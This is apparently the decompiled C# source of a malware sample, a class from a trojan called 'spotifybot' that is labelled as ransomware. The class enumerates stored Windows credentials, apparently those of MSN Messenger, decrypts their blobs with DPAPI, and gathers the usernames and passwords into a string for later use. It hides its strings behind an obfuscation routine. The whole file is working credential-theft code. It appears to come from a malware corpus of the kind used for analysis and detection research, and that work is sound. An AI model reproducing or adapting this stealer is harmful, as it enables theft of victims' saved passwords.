// Decompiled with JetBrains decompiler
// Type: DAMSN
// Assembly: spotifybot, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 49F8E78E-98C1-464D-B8BC-BD712E85FF5D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-4708e643ab129b31b3e067f9a628b4f0e5dfa2fbd30e637e9fb217bb8c703115.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Text;

public class DAMSN
{
  public class MSNdll
  {
    public string DDSHIT(byte[] Datas)
    {
      string str1;
      try
      {
        DAMSN.MSNdll.DATA_BLOGS dataIn = new DAMSN.MSNdll.DATA_BLOGS();
        DAMSN.MSNdll.DATA_BLOGS pDataOut = new DAMSN.MSNdll.DATA_BLOGS();
        GCHandle gcHandle = GCHandle.Alloc((object) Datas, GCHandleType.Pinned);
        dataIn.pbData = gcHandle.AddrOfPinnedObject();
        dataIn.cbData = Datas.Length;
        gcHandle.Free();
        DAMSN.MSNdll.CryptUnprotectData(ref dataIn, 0, 0, 0, 0, 0, ref pDataOut);
        byte[] numArray = new byte[checked (pDataOut.cbData + 1)];
        Marshal.Copy(pDataOut.pbData, numArray, 0, pDataOut.cbData);
        string str2 = Encoding.Default.GetString(numArray);
        str1 = str2.Substring(0, checked (str2.Length - 1));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public static bool CryptUnprotectData(
      ref DAMSN.MSNdll.DATA_BLOGS dataIn,
      int ppszDataDescr,
      int optionalEntropy,
      int pvReserved,
      int pPromptStruct,
      int dwFlags,
      ref DAMSN.MSNdll.DATA_BLOGS pDataOut)
    {
      bool flag;
      return flag;
    }

    public static bool CredEnumerate(
      string filter,
      int flag,
      ref int oMhrmhotLlExlwDkbjCerlkhqoalxa,
      ref IntPtr puweopTywlscmvSnEiihkDydryxgIJ)
    {
      bool flag1;
      return flag1;
    }

    public static void GTMSN()
    {
      string str = RUDUUFDP.CPMXFIPG("KA==", "False");
      int oMhrmhotLlExlwDkbjCerlkhqoalxa = 0;
      IntPtr zero = IntPtr.Zero;
      bool flag = DAMSN.MSNdll.CredEnumerate(RUDUUFDP.CPMXFIPG("mMXV0s+4z7PX1qaW1c/NppmRCA==", "False"), 0, ref oMhrmhotLlExlwDkbjCerlkhqoalxa, ref zero);
      try
      {
        if (!flag)
          return;
        IntPtr[] numArray = new IntPtr[checked (oMhrmhotLlExlwDkbjCerlkhqoalxa - 1 + 1)];
        IntPtr num1 = zero;
        int num2 = checked (oMhrmhotLlExlwDkbjCerlkhqoalxa - 1);
        int index = 0;
        while (index <= num2)
        {
          numArray[index] = Marshal.ReadIntPtr((IntPtr) checked (num1.ToInt32() + IntPtr.Size * index));
          DAMSN.MSNdll.CREDENTIAL structure = (DAMSN.MSNdll.CREDENTIAL) Marshal.PtrToStructure(numArray[index], typeof (DAMSN.MSNdll.CREDENTIAL));
          DAMSN.MSNdll.DATA_BLOGS dataIn = new DAMSN.MSNdll.DATA_BLOGS();
          DAMSN.MSNdll.DATA_BLOGS pDataOut = new DAMSN.MSNdll.DATA_BLOGS();
          dataIn.pbData = structure.lpbCredentialBlob;
          dataIn.cbData = (int) structure.dwCredentialBlobSize;
          DAMSN.MSNdll.CryptUnprotectData(ref dataIn, 0, 0, 0, 0, 1, ref pDataOut);
          str = RUDUUFDP.CPMXFIPG("WnWAh3ladYCHeVp1gIeJcIaAh3ladYCHeVp1gId5WnUr", "False") + Environment.NewLine + Environment.NewLine + RUDUUFDP.CPMXFIPG("ebKvw7GFrK+LYyI=", "False") + Marshal.PtrToStringAuto(structure.lpUserName) + Environment.NewLine + RUDUUFDP.CPMXFIPG("gKzJ0MafvbqXbxY=", "False") + Marshal.PtrToStringAuto(dataIn.pbData) + Environment.NewLine + Environment.NewLine + RUDUUFDP.CPMXFIPG("cYyXnpBxjJeekHGMl56QcYyXnpBxjJeekHGMl56QcYwU", "False");
          checked { ++index; }
        }
        JNXOYT.ISHIE = str;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        JNXOYT.ISHIE = RUDUUFDP.CPMXFIPG("KA==", "False");
        ProjectData.ClearProjectError();
      }
    }

    [Flags]
    public enum CryptProtectPromptFlagz
    {
      CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
      CRYPTPROTECT_PROMPT_ON_PROTECT = 2,
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct DATA_BLOGS
    {
      public int cbData;
      public IntPtr pbData;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CRYPTPROTECT_PROMPTSTRUCTZ
    {
      public int cbSize;
      public DAMSN.MSNdll.CryptProtectPromptFlagz dwPromptFlags;
      public IntPtr hwndApp;
      public string szPrompt;
    }

    public struct CREDENTIAL
    {
      public IntPtr dwFlags;
      public IntPtr dwType;
      public IntPtr lpstrTargetName;
      public IntPtr lpstrComment;
      public System.Runtime.InteropServices.ComTypes.FILETIME ftLastWritten;
      public IntPtr dwCredentialBlobSize;
      public IntPtr lpbCredentialBlob;
      public IntPtr dwPersist;
      public IntPtr dwAttributeCount;
      public IntPtr lpAttributes;
      public IntPtr lpstrTargetAlias;
      public IntPtr lpUserName;
    }
  }
}
